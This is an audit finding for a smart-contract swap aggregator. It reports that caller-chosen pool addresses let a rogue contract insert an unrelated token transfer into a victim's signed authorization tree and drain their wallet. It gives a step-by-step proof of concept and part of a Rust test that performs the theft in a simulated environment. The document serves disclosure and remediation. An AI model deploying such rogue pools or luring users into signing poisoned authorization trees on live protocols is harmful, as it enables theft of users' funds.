### Title
Unconfined swap routes can escape the expected venue boundary and steal unrelated wallet assets - ([File: contracts/swap-aggregator/src/execute/mod.rs])

### Summary

A caller-supplied route can name an arbitrary contract as a hop pool, and the router invokes that contract while the caller’s authorization context remains active. If the victim signs the simulated authorization tree, malicious pool code can add an unrelated `token.transfer(victim, attacker, amount)` beneath the swap authorization and drain wallet assets that are not part of the swap. [1](#0-0) [2](#0-1) 

### Finding Description

`execute_strategy(sender, total_in, swap_xdr)` authenticates `sender`, decodes an address registry from the supplied payload, and resolves each hop’s `pool`, `token_in`, and `token_out` from caller-controlled indices. [3](#0-2) [4](#0-3) 

The venue adapters invoke the supplied pool address, and no production check confines that address to an approved pool or verified implementation. [5](#0-4) [6](#0-5) 

The controller exposes this route through account operations such as `swap_collateral`, whose `swap: Bytes` argument is forwarded to `execute_strategy` after the controller creates only its own exact input-transfer authorization. [7](#0-6) [8](#0-7) 

This is analogous to directory traversal: the supplied route is treated as a trusted path through a venue, but the address registry permits `../`-style escape to arbitrary contract code outside the intended pool boundary. [1](#0-0) 

The repository’s focused test demonstrates that a rogue hop can call `wallet_token.transfer(victim, attacker, WALLET_BALANCE)`, that transaction simulation records that transfer as a child of the victim’s `swap_collateral` authorization, and that submitting the signed tree moves the victim’s entire unrelated wallet balance. [9](#0-8) [10](#0-9) 

### Impact Explanation

A malicious route can steal arbitrary token balances from the swap caller, including assets never supplied to, listed by, or otherwise intended for interaction with the lending protocol. [11](#0-10) [12](#0-11) 

The loss is not limited to the routed input: the malicious hop can satisfy the router’s measured-input and positive-output checks while also inserting an unrelated transfer into the caller’s authorization tree. [13](#0-12) [12](#0-11) 

### Likelihood Explanation

The attacker needs to induce the victim to submit a malicious route and sign the authorization tree returned by simulation. [14](#0-13) 

No protocol privilege, leaked key, compromised router, or invalid market configuration is required because the route’s pool address is already part of the caller-supplied strategy. [15](#0-14) [4](#0-3) 

The attack is nevertheless conditional on victim interaction and on the wallet or client failing to reject an unexpected child authorization, so it is less direct than an unauthenticated drain. [16](#0-15) 

### Recommendation

Do not allow caller-provided pool addresses to be invoked as route venues unless they resolve to a governance-approved, immutable venue-pool registry entry or a cryptographically verified pool identity. [1](#0-0) 

If arbitrary pools remain supported, require the signing path to decode the payload, display every venue and token address, and reject any authorization child other than the single expected input transfer. [17](#0-16) [18](#0-17) 

### Proof of Concept

1. Deploy a rogue contract exposing the selected venue’s expected `swap` interface.
2. Inside that function, call `token::Client::new(env, &victim_token).transfer(&victim, &attacker, &victim_balance)` before returning a commercially valid swap result. [9](#0-8) 
3. Encode a route whose `assets` registry contains the rogue contract as the hop pool and whose measured output meets the route minimum. [19](#0-18) 
4. Have the victim invoke `swap_collateral(caller=victim, account_id, current, amount, new, swap=route)`. [20](#0-19) 
5. Simulation records `victim_token.transfer(victim, attacker, victim_balance)` as a child of the victim’s `swap_collateral` authorization. [21](#0-20) 
6. Submitting that signed tree completes the fair collateral swap and simultaneously transfers the unrelated wallet balance to the attacker. [12](#0-11)

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
